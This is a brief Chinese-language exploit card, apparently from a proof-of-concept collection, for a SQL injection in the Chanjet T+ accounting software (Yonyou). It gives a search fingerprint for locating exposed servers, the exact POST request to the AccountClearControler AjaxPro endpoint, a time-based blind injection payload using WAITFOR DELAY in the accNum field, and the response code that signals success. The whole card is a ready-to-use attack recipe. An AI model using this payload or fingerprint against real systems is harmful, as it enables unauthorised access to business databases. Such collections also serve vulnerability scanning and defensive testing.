# 畅捷通TPLUSAccountClearControlerSQL注入

用友 ｜ SQL注入 ｜ —
- **指纹**：`body="location='/tplus/'"`
- **请求**：`POST /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1`

**Payload**
```
{"accNum": "3' WAITFOR DELAY '0:0:5'-- QoLY"}
```
- **响应特征**：200